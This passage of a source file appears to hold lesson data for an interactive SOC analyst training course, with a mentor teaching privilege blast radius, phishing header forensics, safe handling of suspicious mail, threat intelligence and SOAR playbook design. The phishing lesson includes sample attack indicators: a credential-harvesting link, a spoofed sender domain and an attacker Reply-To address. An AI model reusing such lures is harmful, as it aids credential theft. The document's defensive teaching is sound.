          heading: 'Standard User vs Privileged Admin Roles & Blast Radius',
          paragraph1:
            'Meera compares two accounts on the console: "Access changes the stakes. An analyst must understand the structural blast radius of each account tier: Standard User FIN-OPS-01 versus Domain Administrator ADM-SRV-09."',
          paragraph2:
            'Standard user compromise is contained to branch files and personal emails. Domain administrator compromise grants full Active Directory replication rights, DCSync privileges, and potential enterprise-wide ransomware deployment.',
          techBoxTitle: 'TECH BOX: Windows Privilege Rings, Domain Admins vs Standard Users & Blast Radius [Details]',
          techBoxAnalogy:
            'A hotel guest room key card grants access only to Room 314 (Standard User); the general manager\'s master key unlocks every suite, safe, and utility closet in the building (Domain Admin).',
          techBoxDef:
            'Blast Radius measures the maximum extent of operational damage, data exfiltration, or system compromise an adversary can achieve using a specific credential principal.',
          techBoxWhy:
            'Determines escalation urgency and containment scope: admin credential loss requires emergency forest isolation, whereas standard user compromise follows focused remediation.',
          defaultAnimation: 'm11-privilege-blast-radius' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'priv-standard-user', label: '1. STANDARD ACCOUNT' },
            { id: 'priv-admin-account', label: '2. DOMAIN ADMIN' },
            { id: 'priv-blast-comparison', label: '3. BLAST RADIUS' },
            { id: 'priv-meera-boundary', label: '4. TIERED DEFENSE' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: IMPACT-BASED TRIAGE',
          subPillar: 'TITLE BIAS VS DATA VALUE',
          heading: 'Impact-Based Triage vs Account Title Bias',
          paragraph1:
            'Meera warns against account title bias: "Rookie analysts chase every alert with \'Admin\' in the title while ignoring standard accounts. This is a fatal trap. Attackers intentionally target branch accountants to steal funds directly."',
          paragraph2:
            'An alert on FIN-OPS-01 exporting the corporate wire-transfer customer database is Sev-1 Critical because the data at risk is catastrophic. An alert on ADM-SRV-09 restarting a print spooler during a scheduled change window is Sev-4 routine.',
          techBoxTitle: 'TECH BOX: Business Email Compromise (BEC), Wire Transfer Fraud & Objective Triage [Details]',
          techBoxAnalogy:
            'A burglar stealing the keys to the company safe (Domain Admin) vs a burglar walking directly out the front door carrying bags of cash from the teller counter (Accountant Wire Theft).',
          techBoxDef:
            'Impact-Based Triage ranks incidents by actual potential business financial and operational loss rather than raw security title or administrative permission score.',
          techBoxWhy:
            'Ensures high-consequence business logic attacks and invoice redirection scams are intercepted before fraudulent transactions clear financial gateways.',
          defaultAnimation: 'm11-impact-based-triage' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'imp-standard-valuable', label: '1. SEV-1 WIRE TRANSFER' },
            { id: 'imp-admin-routine', label: '2. SEV-4 ROUTINE ADMIN' },
            { id: 'imp-triage-matrix', label: '3. 3D IMPACT MATRIX' },
            { id: 'imp-meera-verdict', label: '4. TITLE BIAS RULE' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: DIRECTORY REALITY',
          subPillar: 'STALE RECORDS & GROUND TRUTH',
          heading: 'Active Directory Reality vs Verified Identity Owners',
          paragraph1:
            'Meera questions directory assumptions: "What if account ownership records in Active Directory are outdated? Directory information is context to check, not unquestionable divine truth."',
          paragraph2:
            'An inspection reveals that FIN-OPS-01 transferred to Auditing 8 months ago, but shadow group permissions to finance folders were never revoked. The apprentice follows approved protocol: contacting the verified Identity Owner rather than guessing.',
          techBoxTitle: 'TECH BOX: Active Directory Group Creep, Shadow Admins & Identity Governance (IGA) [Details]',
          techBoxAnalogy:
            'An employee who moves from marketing to legal but retains their old building keys because facilities forgot to collect them from their keychain.',
          techBoxDef:
            'Permission Creep occurs when employees accumulate security group memberships over years of departmental transfers, resulting in excessive unmonitored privileges.',
          techBoxWhy:
            'Teaches analysts that static LDAP records can be stale. Verifying ground truth through designated identity owners prevents wrongful accusations and policy oversights.',
          defaultAnimation: 'm11-identity-directory-truth' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'dir-ldap-record', label: '1. LDAP ATTRIBUTES' },
            { id: 'dir-stale-gap', label: '2. STALE GROUP GAP' },
            { id: 'dir-owner-verify', label: '3. IDENTITY OWNER' },
            { id: 'dir-meera-seal', label: '4. UNIT 1 SIGN-OFF ✓' },
          ],
        },
      ];
    }

    // Chapter 3: The reported message arrives
    if (chId === 'M11-U2-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: MESSAGE ANATOMY',
          subPillar: 'HEADER DISSECTION & ARTIFACT',
          heading: 'Reported Message Artifact Anatomy (MSG-2026-904)',
          paragraph1:
            'Mentor Meera presents a suspicious email reported by the branch finance team: "The reported message is a fresh lead. We inspect it as an isolated forensic artifact (MSG-2026-904.eml), never as an active email inside our mail client."',
          paragraph2:
            'The apprentice dissects the header trail: visible display name claims "Ananya (FinCorp Lead)", but the actual RFC5322 header address points to billing-notice@mail-secure-update.xyz. Reading Received headers from bottom to top exposes the true originating adversary IP 198.51.100.42.',
          techBoxTitle: 'TECH BOX: RFC5321 vs RFC5322 Headers, Display Name Spoofing & MTA Received Hops [Details]',
          techBoxAnalogy:
            'A letter arriving with a handwritten signature claiming to be the CEO, but the post office routing stamp on the envelope proves it was mailed from an offshore postbox.',
          techBoxDef:
            'Email Header Forensic Dissection examines the chain of Mail Transfer Agent (MTA) Received headers bottom-to-top to determine the true unforgeable IP address of the originating mail server.',
          techBoxWhy:
            'Unmasks sophisticated spear-phishing attacks that impersonate senior executives to trick employees into running malicious attachments.',
          defaultAnimation: 'm11-email-artifact-anatomy' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'art-preserved-eml', label: '1. MSG-2026-904 ARTIFACT' },
            { id: 'art-display-spoof', label: '2. DISPLAY NAME SPOOF' },
            { id: 'art-envelope-rfc5321', label: '3. RFC5321 ENVELOPE' },
            { id: 'art-meera-dissection', label: '4. HOP DISSECTION' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: LINK & REPLY-TO INSPECTION',
          subPillar: 'DECEPTIVE URL TRAPS',
          heading: 'Misleading Hyperlinks & Sneaky Reply-To Traps',
          paragraph1:
            'Meera demonstrates visual deception: "A link displays a familiar corporate portal URL. Does that make it safe? Visible anchor text is pure HTML cosmetic formatting—anyone can write whatever text they choose."',
          paragraph2:
            'Inspecting the raw href attribute reveals the trap: http://auth-fincorp-update.ru/credential-harvest. Furthermore, the message uses a deceptive Reply-To: evil-drop@proton.me to route user inquiries directly into the attacker\'s private mailbox.',
          techBoxTitle: 'TECH BOX: HTML Anchor Formatting, URL Redirection & The Reply-To Mismatch Attack [Details]',
          techBoxAnalogy:
            'A road sign displaying "FinCorp Headquarters 2 Miles" placed by highway bandits over an exit ramp that leads straight into a dead-end alley.',
          techBoxDef:
            'Hyperlink Spoofing masks the true destination URL behind trusted anchor text; Reply-To Spoofing overrides the default return address so email client replies route to the adversary.',
          techBoxWhy:
            'Essential for L1 analysts to identify credential harvesting infrastructure and defang links before communicating findings to the team.',
          defaultAnimation: 'm11-misleading-links-traps' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'link-visible-anchor', label: '1. VISIBLE ANCHOR BAIT' },
            { id: 'link-hidden-url', label: '2. HIDDEN DESTINATION' },
            { id: 'link-replyto-mismatch', label: '3. REPLY-TO TRAP' },
            { id: 'link-meera-defanging', label: '4. DEFANG STANDARD' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: EMAIL AUTHENTICATION',
          subPillar: 'SPF, DKIM & DMARC TRIAD',
          heading: 'SPF, DKIM, and DMARC Verification Breakdown',
          paragraph1:
            'Meera walks through the three foundational email authentication protocols: SPF verifies sending server IP, DKIM verifies cryptographic transit signature, and DMARC enforces domain alignment and failure policy.',
          paragraph2:
            'Meera delivers a critical teaching: "An email passing SPF and DKIM does NOT mean the content is safe! Cybercriminals regularly register their own disposable domains with perfect 100% passing DMARC records to deliver malware."',
          techBoxTitle: 'TECH BOX: SPF DNS Records, DKIM Public-Key Cryptography & DMARC Policy Alignment [Details]',
          techBoxAnalogy:
            'A verified passport proves the traveler\'s legal identity and citizenship; it does not prove that the traveler isn\'t carrying contraband in their suitcase.',
          techBoxDef:
            'Email Authentication Protocols validate domain identity and message integrity, but they cannot evaluate the maliciousness of embedded payloads, URLs, or social engineering intent.',
          techBoxWhy:
            'Dispels the dangerous beginner belief that an email with passing SPF/DKIM is guaranteed to be harmless.',
          defaultAnimation: 'm11-spf-dkim-dmarc-engine' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'auth-spf-breakdown', label: '1. SPF CHECK (PASS)' },
            { id: 'auth-dkim-breakdown', label: '2. DKIM SIGNATURE (PASS)' },
            { id: 'auth-dmarc-breakdown', label: '3. DMARC ALIGN (FAIL)' },
            { id: 'auth-meera-fallacy', label: '4. PASS ≠ SAFE DOCTRINE' },
          ],
        },
      ];
    }

    // Chapter 4: Handle the message without becoming the victim
    if (chId === 'M11-U2-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: SAFE HANDLING',
          subPillar: 'FORENSIC QUARANTINE CHAMBER',
          heading: 'Preserved Message Quarantine & Non-Clickable Sandboxing',
          paragraph1:
            'Mentor Meera instructs: "Handle the message without becoming the victim. Use approved tools and procedures. Do not forward suspicious emails casually or open attachments on your personal laptop."',
          paragraph2:
            'The suspicious email is isolated in a secure quarantine vault. Web links are defanged into hxxps[://], tracking scripts are stripped, and binary attachment Quarterly_Invoice_Q3.xlsm is locked with zero desktop execution permission.',
          techBoxTitle: 'TECH BOX: Forensic Mail Vaults, Script Neutralization & URL Defanging Protocols [Details]',
          techBoxAnalogy:
            'Handling an explosive ordinance: bomb technicians transport the device inside a reinforced containment sphere rather than poking at it with bare hands.',
          techBoxDef:
            'Forensic Quarantine isolates weaponized messages in read-only containers, stripping dynamic execution engines to allow safe header and text examination.',
          techBoxWhy:
            'Prevents SOC analysts from accidentally triggering adversary tracking beacons or infecting analyst workstations.',
          defaultAnimation: 'm11-quarantine-defanged-sandbox' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'quar-vault-isolation', label: '1. QUARANTINE VAULT' },
            { id: 'quar-unclickable-links', label: '2. DEFANGED VIEWER' },
            { id: 'quar-defanged-attachments', label: '3. ATTACHMENT LOCK' },
            { id: 'quar-meera-discipline', label: '4. NON-VICTIM DISCIPLINE' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: DATA PROTECTION',
          subPillar: 'PUBLIC SCANNER LEAK HAZARD',
          heading: 'Data Leakage Hazard: Public Lookup Violation',
          paragraph1:
            'Meera explains a major operational hazard: "Reported emails often contain proprietary company budgets, customer PII, or internal passwords. What happens if an analyst uploads the raw message to a public multi-scanner?"',
          paragraph2:
            'Uploading proprietary files to public scanners like VirusTotal allows thousands of external subscribers worldwide to download the entire document! The approved procedure is querying the cryptographic file hash or using private internal sandboxes.',
          techBoxTitle: 'TECH BOX: Public Sandbox Data Exposure, Confidentiality Governance & Hash Lookups [Details]',
          techBoxAnalogy:
            'Taking a confidential company trade secret document and posting it on a public library bulletin board to see if anyone recognizes the font.',
          techBoxDef:
            'Public Sandbox Leakage occurs when confidential enterprise emails or attachments are submitted to public threat analysis engines that redistribute uploaded files to global intelligence feeds.',
          techBoxWhy:
            'Violates data privacy regulations (GDPR, DPDP) and alerts adversaries that their targeted campaign was detected.',
          defaultAnimation: 'm11-data-leakage-prevention' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'leak-internal-confidential', label: '1. SENSITIVE CONTENT' },
            { id: 'leak-public-virustotal', label: '2. PUBLIC SCANNER TRAP' },
            { id: 'leak-approved-internal', label: '3. APPROVED PROTOCOL' },
            { id: 'leak-meera-governance', label: '4. OPSEC LAW' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: STATIC ANALYSIS',
          subPillar: 'METADATA & TIER-2 HANDOFF',
          heading: 'Sanitized Artifact Inspection & L1-to-L2 Malware Escalation',
          paragraph1:
            'Meera demonstrates static analysis: "You can extract immense forensic value without executing code. We calculate the SHA-256 hash of the attachment directly from disk and inspect its OLE macro streams."',
          paragraph2:
            'Static tools detect an Auto_Open macro routine designed to execute shell commands. The L1 analyst compiles the artifact reference MSG-2026-904, observed headers, and SHA-256 hash into a clean escalation package for Tier 2 detonation.',
          techBoxTitle: 'TECH BOX: Cryptographic File Hashing, OLE Stream Analysis & Tier 2 Malware Handoff [Details]',
          techBoxAnalogy:
            'An x-ray technician scanning luggage: identifying suspicious wiring and batteries inside a suitcase without unzipping it or detonating the contents.',
          techBoxDef:
            'Static File Analysis evaluates file structure, embedded macros, and cryptographic hashes without executing code in an active CPU execution context.',
          techBoxWhy:
            'Equips L1 analysts with high-confidence triage evidence to justify specialized Tier-2 malware lab detonation.',
          defaultAnimation: 'm11-attachment-hash-escalation' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'att-hash-sha256', label: '1. SHA-256 HASH' },
            { id: 'att-metadata-pe', label: '2. OLE AUTO_OPEN HOOK' },
            { id: 'att-l2-escalation', label: '3. TIER-2 ESCALATION' },
            { id: 'att-meera-signoff', label: '4. UNIT 2 SIGN-OFF ✓' },
          ],
        },
      ];
    }

    // Chapter 5: Outside information, carefully used
    if (chId === 'M11-U3-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: THREAT INTEL TAXONOMY',
          subPillar: 'PYRAMID OF PAIN',
          heading: 'Threat Intelligence IOC Taxonomy (David Bianco\'s Pyramid of Pain)',
          paragraph1:
            'Mentor Meera introduces the Pyramid of Pain: "Outside threat intelligence is composed of different indicator types. David Bianco\'s pyramid illustrates the operational pain inflicted on an adversary when we detect each type."',
          paragraph2:
            'File hashes are trivial (adversaries change one byte to bypass them); IP addresses and domains are simple (attackers easily rotate cloud VPS hosts); but detecting and blocking adversary Tools and TTPs inflicts maximum pain, forcing them to abandon their campaign.',
          techBoxTitle: 'TECH BOX: David Bianco\'s Pyramid of Pain, Indicator Robustness & MITRE ATT&CK [Details]',
          techBoxAnalogy:
            'Like insect control: swatting a single mosquito is trivial (IP block); spraying bug repellent is annoying (domain sinkhole); draining the standing swamp where mosquitoes breed is permanent eradication (TTP detection).',
          techBoxDef:
            'The Pyramid of Pain visualizes the relationship between the types of indicators defenders can detect and the amount of operational difficulty inflicted on the adversary.',
          techBoxWhy:
            'Guides SOC detection engineering from fragile static hash blocking toward durable behavioral telemetry defense.',
          defaultAnimation: 'm11-threat-intel-pyramid' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'pyr-trivial-hashes', label: '1. TRIVIAL (HASHES)' },
            { id: 'pyr-easy-network', label: '2. EASY (IPS & DOMAINS)' },
            { id: 'pyr-tough-ttps', label: '3. TOUGH (TTPS)' },
            { id: 'pyr-meera-synthesis', label: '4. PYRAMID DOCTRINE' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: INDICATOR FRESHNESS',
          subPillar: 'CONFIDENCE HALF-LIFE DECAY',
          heading: 'IOC Provenance, Source Reliability & Freshness Half-Life',
          paragraph1:
            'Meera explores indicator decay: "A threat intelligence observable is not valid forever. An active C2 beacon observed 30 minutes ago has 95% operational confidence. A malicious IP report from 14 months ago has decayed to near zero."',
          paragraph2:
            'Cloud infrastructure churns rapidly. Attackers abandon VPS hosts within hours, and cloud providers reassign those IPs to innocent organizations. Blocking stale IP indicators causes self-inflicted business outages.',
          techBoxTitle: 'TECH BOX: Indicator Half-Life, IP Churn & Threat Feed Provenance [Details]',
          techBoxAnalogy:
            'Like perishable milk: fresh milk is nutritious and safe; drinking expired milk from six months ago makes everyone sick.',
          techBoxDef:
            'Indicator Freshness measures the temporal relevance of a threat observable, accounting for dynamic IP recycling, domain expiration, and threat actor infrastructure rotation.',
          techBoxWhy:
            'Prevents firewalls from blocking legitimate services that inherited recycled cloud IP addresses from historical attacks.',
          defaultAnimation: 'm11-ioc-provenance-freshness' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'fresh-active-c2', label: '1. FRESH (30 MINS)' },
            { id: 'fresh-stale-recycled', label: '2. STALE (14 MONTHS)' },
            { id: 'fresh-confidence-decay', label: '3. HALF-LIFE DECAY' },
            { id: 'fresh-meera-rule', label: '4. PROVENANCE RULE' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: INTELLIGENCE STANDARDS',
          subPillar: '4-FACET SOURCED NOTE',
          heading: 'Sourced Intelligence Note Standards',
          paragraph1:
            'Meera teaches professional documentation: "A copied red label from an external website is not an intelligence note. Every threat intelligence finding in your ticket must follow four standard facets."',
          paragraph2:
            'The apprentice inspects the four facets: Source Database Provenance (MISP / Talos), Coordinated Universal Timestamp (2026-10-15T09:42:18Z), Qualified Finding Statement (Cobalt Strike C2 on port 443), and Explicit Confidence Limits.',
          techBoxTitle: 'TECH BOX: Contemporaneous Intelligence Documentation, MISP Feeds & Confidence Scoring [Details]',
          techBoxAnalogy:
            'A sworn court testimony: stating who observed the event, the exact minute of observation, the verifiable fact, and the honest limits of what was witnessed.',
          techBoxDef:
            'Sourced Intelligence Standards mandate that all external IOC references include source attribution, UTC query timestamps, functional threat descriptions, and confidence levels.',
          techBoxWhy:
            'Produces audit-proof incident tickets that allow senior analysts to trust and verify threat intelligence without re-running obsolete queries.',
          defaultAnimation: 'm11-sourced-intelligence-note' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'note-provenance-source', label: '1. SOURCE PROVENANCE' },
            { id: 'note-utc-timestamp', label: '2. UTC TIMESTAMP' },
            { id: 'note-finding-verdict', label: '3. QUALIFIED FINDING' },
            { id: 'note-meera-limits', label: '4. CONFIDENCE LIMITS' },
          ],
        },
      ];
    }

    // Chapter 6: A lead becomes a qualified finding
    if (chId === 'M11-U3-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: MULTI-SOURCE CORRELATION',
          subPillar: 'SOLID (FACT) VS DOTTED (LEAD)',
          heading: 'Multi-Source Correlation: Verified Links vs Hypotheses',
          paragraph1:
            'Mentor Meera reviews the final case synthesis: "How does an unconfirmed lead become a qualified finding? We draw solid lines for verified evidentiary links and dotted lines for investigative hypotheses."',
          paragraph2:
            'Gateway logs confirm MSG-2026-904.eml delivered to BLR-BR-WS-04 (Solid Green Line). EDR logs show an outbound connection to 198.51.100.42 shortly thereafter. But did the email macro launch the beacon? Until parent-child process ancestry is proven, that link remains a dotted hypothesis line.',
          techBoxTitle: 'TECH BOX: Evidentiary Correlation, Parent-Child Process Ancestry & Hypothesis Demarcation [Details]',
          techBoxAnalogy:
            'In a trial, fingerprints on the stolen car are solid evidence; seeing the suspect walking down the street two blocks away is a dotted lead requiring corroboration.',
          techBoxDef:
            'Hypothesis Demarcation explicitly separates proven causal links verified across synchronized event logs from plausible working theories that require additional forensic telemetry.',
          techBoxWhy:
            'Maintains forensic integrity, preventing false conclusions and flawed executive briefings.',
          defaultAnimation: 'm11-multi-source-correlation' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'cor-verified-solid', label: '1. SOLID: VERIFIED FACT' },
            { id: 'cor-hypothesis-dotted', label: '2. DOTTED: WORKING LEAD' },
            { id: 'cor-cross-source-fusion', label: '3. TELEMETRY FUSION' },
            { id: 'cor-meera-discipline', label: '4. INTEGRITY DOCTRINE' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: ATTRIBUTION RESTRAINT',
          subPillar: 'SHARED INFRASTRUCTURE TRAP',
          heading: 'Shared Infrastructure & The IP Attribution Trap',
          paragraph1:
            'Meera exposes a dangerous pitfall: "Shared infrastructure can be used by many parties. An address overlap does not identify an attacker by itself. Cybercriminals intentionally host malicious pages on Cloudflare or AWS edge IPs."',
          paragraph2:
            'If an analyst jumps to conclusions and blocks that shared IP, thousands of legitimate websites sharing that edge node are knocked offline. Disciplined analysts pivot on unique SSL certificate serial numbers or custom URI paths rather than generic shared IPs.',
          techBoxTitle: 'TECH BOX: Multi-Tenant Cloud Edge, JARM Fingerprinting & The Geopolitical Attribution Fallacy [Details]',
          techBoxAnalogy:
            'Finding a dropped glove in a public train station used by 200,000 commuters daily and claiming the glove belongs to a specific international spy without DNA testing.',
          techBoxDef:
            'The Attribution Fallacy is the premature leap from observing foreign infrastructure to naming a specific advanced threat group without distinctive TTP corroboration.',
          techBoxWhy:
            'Focuses L1 analysts on practical defense, containment, and evidence preservation rather than speculative geopolitical drama.',
          defaultAnimation: 'm11-shared-infrastructure-trap' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'trap-shared-cdn-ip', label: '1. SHARED CDN REALITY' },
            { id: 'trap-attribution-fallacy', label: '2. ATTRIBUTION TRAP' },
            { id: 'trap-disciplined-pivot', label: '3. DISCIPLINED PIVOT' },
            { id: 'trap-meera-restraint', label: '4. RESTRAINT DOCTRINE' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: MASTER DOSSIER & SIGNOFF',
          subPillar: 'NO HIT ≠ BENIGN & SUPERVISORY SEAL',
          heading: 'The "No Reputation Hit ≠ Benign" Doctrine & Module 11 Sign-Off',
          paragraph1:
            'Meera concludes the module with a foundational principle: "Does \'no reputation hit\' equal benign? Absolutely not. It only means this source has not seen it yet. Fresh targeted malware and novel C2 domains always begin with a 0/70 score."',
          paragraph2:
            'The apprentice assembles the complete Case #2026-881 Intelligence Dossier: identity telemetry, sanitized email headers, defanged IOCs, and qualified Tier-2 escalation notes. Mentor Meera reviews the package and stamps the official CDAC Bengaluru supervisory seal.',
          techBoxTitle: 'TECH BOX: Zero-Day Threat Realities, Sourced Intelligence Dossiers & CDAC Supervisory Sign-Off [Details]',
          techBoxAnalogy:
            'A newly discovered viral strain has no entries in the medical textbook simply because doctors have just encountered it for the first time.',
          techBoxDef:
            'Absence of Evidence is not Evidence of Absence: threat intelligence feeds report historical observations; zero reputation hits must never override suspicious local behavioral indicators.',
          techBoxWhy:
            'Completes Module 11 by instilling professional forensic confidence, ethical restraint, and thorough documentation standards.',
          defaultAnimation: 'm11-intel-dossier-signoff' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'dos-no-hit-doctrine', label: '1. NO HIT ≠ BENIGN' },
            { id: 'dos-evidence-summary', label: '2. CASE #2026-881 DOSSIER' },
            { id: 'dos-tier2-handoff', label: '3. TIER-2 HANDOFF' },
            { id: 'dos-meera-master-seal', label: '4. MEERA MASTER SEAL ✓' },
          ],
        },
      ];
    }

    // =========================================================================
    // MODULE 12: SOAR & BASIC SOC AUTOMATION (18 Bespoke Pillars)
    // Guide: Mentor Karthik (SOC Automation Lead & Workflow Architect)
    // =========================================================================

    // Chapter 1: Triggers, actions and playbooks
    if (chId === 'M12-U1-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: PLAYBOOK ANATOMY',
          subPillar: 'TRIGGER, ACTION & CONDITION PIPELINE',
          heading: 'Deconstructing Automated Security Workflows',
          paragraph1:
            'A security playbook is not merely a script of clicks; it is a structured data pipeline composed of five distinct components: Ingestion Triggers, Input Data Contracts, Automated Actions, Conditional Branches, and Standardized Output Dockets.',
          paragraph2:
            'Mentor Karthik instructs: "A trigger initiates the workflow upon an event like an incoming webhook. The input contract sanitizes raw parameters. Actions query APIs deterministically. Conditions decide the path, and outputs present clean evidence."',
          techBoxTitle: 'TECH BOX: Playbook Ingestion Contracts & Data Schemas',
          techBoxAnalogy:
            'Like a precision automated assembly line: the photoelectric sensor triggers the belt, incoming parts are gauged against strict blueprints, and robotic arms stamp welds only when alignment tolerance is 100%.',
          techBoxDef:
            'Playbook Anatomy defines the modular lifecycle of automated security operations: Trigger (event arrival) -> Input Schema (parameter parsing) -> Action (external API invocation) -> Output (structured case docket).',
          techBoxWhy:
            'Guarantees predictable execution across hundreds of daily alerts, preventing unhandled exceptions from crashing SOC automation pipelines.',
          defaultAnimation: 'm12-playbook-anatomy-pipeline' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'pb-trigger-node', label: '1. TRIGGER INGEST' },
            { id: 'pb-input-contract', label: '2. INPUT CONTRACT' },
            { id: 'pb-action-node', label: '3. API ACTION' },
            { id: 'pb-output-decision', label: '4. DECISION DOCKET' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: INPUT VALIDATION',
          subPillar: 'AUTOMATING ASSUMPTIONS VS RFC1918 GATES',
          heading: 'Deterministic Regex & Private IP Exclusion',
          paragraph1:
            'The cardinal danger in SOC automation is automating an assumption. Feeding raw strings like "198.51.100.42:8080/login" directly into firewall or threat intelligence APIs causes malformed payload rejections or dangerous parsing bugs.',
          paragraph2:
            'Karthik highlights: "Never assume an alert payload is safe or correctly bounded. Validate IPv4 octets with strict regular expressions, and enforce hard RFC1918 exclusion gates so internal IPs like 10.10.10.1 are never leaked to public threat feeds."',
          techBoxTitle: 'TECH BOX: Garbage-In Hazards & Internal Data Leakage',
          techBoxAnalogy:
            'Like an airport baggage inspection scanner that rejects unsealed or oversized luggage at the check-in conveyor before it jams the high-speed baggage sorting machinery.',
          techBoxDef:
            'Input Validation Guardrail: A programmatic filter that validates syntactic bounds (IPv4/SHA256 regex) and semantic rules (RFC1918 exclusion) before triggering external API connectors.',
          techBoxWhy:
            'Prevents internal infrastructure schemes from leaking to external vendors and shields security appliances from API injection attacks.',
          defaultAnimation: 'm12-input-validation-guard' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'val-raw-payload', label: '1. RAW PAYLOAD' },
            { id: 'val-regex-validator', label: '2. REGEX VALIDATOR' },
            { id: 'val-internal-exclusion', label: '3. RFC1918 GATE' },
            { id: 'val-clean-observable', label: '4. CLEAN OBSERVABLE' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: CONDITIONAL BRANCHING',
          subPillar: 'SAFE MULTI-PATH DECISION LOGIC',
          heading: 'Evaluating Thresholds: Benign, Suspicious & Ambiguous',
          paragraph1:
            'Linear playbooks fail when encountering real-world ambiguity. Sophisticated SOC workflows branch into distinct operational pathways based on objective criteria: verified benign, confirmed suspicious, or ambiguous/unknown.',
          paragraph2:
            'Karthik teaches: "Green paths attach evidence and close benign false alarms quietly. Red paths assemble containment requests for human authorization. And amber paths route ambiguous observables to the L1 analyst queue for cognitive inspection."',
          techBoxTitle: 'TECH BOX: Decision Logic & Triage Routing Trees',
          techBoxAnalogy:
            'Like a railroad track switch: passenger trains route directly to platforms, freight trains divert to cargo terminals, and unscheduled locomotives halt on inspection sidings until the dispatcher clears the track.',
          techBoxDef:
            'Conditional Branching: Rule-based decision points within a playbook that evaluate observable metrics (reputation scores, asset criticality, business hours) to choose the appropriate operational response.',
          techBoxWhy:
            'Eliminates brittle single-path playbooks that either over-quarantine harmless staff workstations or fail to escalate complex multi-stage attacks.',
          defaultAnimation: 'm12-conditional-branching-logic' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'bra-condition-eval', label: '1. CONDITIONAL EVAL' },
            { id: 'bra-benign-branch', label: '2. GREEN: BENIGN' },
            { id: 'bra-malicious-branch', label: '3. RED: SUSPICIOUS' },
            { id: 'bra-ambiguous-branch', label: '4. AMBER: UNKNOWN' },
          ],
        },
      ];
    }

    // Chapter 2: Enrichment and notification use cases
    if (chId === 'M12-U1-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: AUTOMATED ENRICHMENT',
          subPillar: 'PARALLEL API LOOKUPS (MISP, LDAP, EDR)',
          heading: 'Asynchronous Multi-Source Telemetry Gathering',
          paragraph1:
            'When an alert triggers, manual queries across three separate browser tabs waste 15 minutes of analyst time. Automated enrichment executes parallel API calls to MISP threat intelligence, Active Directory LDAP, and EDR agent telemetry simultaneously.',
          paragraph2:
            'Karthik notes: "In less than 500 milliseconds, the SOAR engine correlates external threat reputation with internal user department and host operating system status, consolidating facts before the human analyst opens the ticket."',
          techBoxTitle: 'TECH BOX: Parallel Connectors & Rate-Limit Throttling',
          techBoxAnalogy:
            'Like an executive assistant who hands you the dossier with background facts, company hierarchy, and previous meeting notes the instant an unexpected caller phones your desk.',
          techBoxDef:
            'Automated Enrichment: The concurrent, asynchronous gathering of contextual evidence (threat intelligence, directory ownership, host telemetry) to enrich raw alerts into comprehensive investigation dockets.',
          techBoxWhy:
            'Drastically reduces Mean Time to Triage (MTTT) and frees human analysts from repetitive mechanical lookups so they can focus on cognitive reasoning.',
          defaultAnimation: 'm12-automated-enrichment-loop' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'enr-ingest-alert', label: '1. INGEST DISPATCH' },
            { id: 'enr-misp-threat', label: '2. MISP INTEL' },
            { id: 'enr-ldap-identity', label: '3. LDAP DIRECTORY' },
            { id: 'enr-edr-telemetry', label: '4. EDR TELEMETRY' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: DRAFT CASE NOTIFICATIONS',
          subPillar: 'CASE #2026-881 SYNTHESIS WITHOUT AUTO-CLOSE',
          heading: 'Drafting Incident Notes for Human Decision',
          paragraph1:
            'Automation excels at gathering facts, drafting notes, and formatting incident tickets. However, a playbook must NEVER autonomously close an active security case or dismiss a lead without verified human sign-off.',
          paragraph2:
            'Karthik explains: "Case #2026-881 received automated enrichment for workstation BLR-BR-WS-04. The playbook generated a draft summary and tagged the shift lead. It assisted human judgment; it did not replace it."',
          techBoxTitle: 'TECH BOX: The "No Autonomous Auto-Close" Doctrine',
          techBoxAnalogy:
            'Like a medical diagnostic lab machine that prints comprehensive blood chemistry panels for the attending physician, but does not autonomously write patient discharge orders.',
          techBoxDef:
            'Case Docket Synthesis: The automated aggregation of alert telemetry into a standardized, human-readable draft case note within Jira or TheHive, preserving full context for the on-shift Tier-1 analyst.',
          techBoxWhy:
            'Prevents "silent closures" where automated playbooks hide slow, sophisticated attacks under the guise of automated resolution.',
          defaultAnimation: 'm12-case-notification-docket' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'not-draft-docket', label: '1. DRAFT DOCKET' },
            { id: 'not-no-auto-close', label: '2. NO AUTO-CLOSE' },
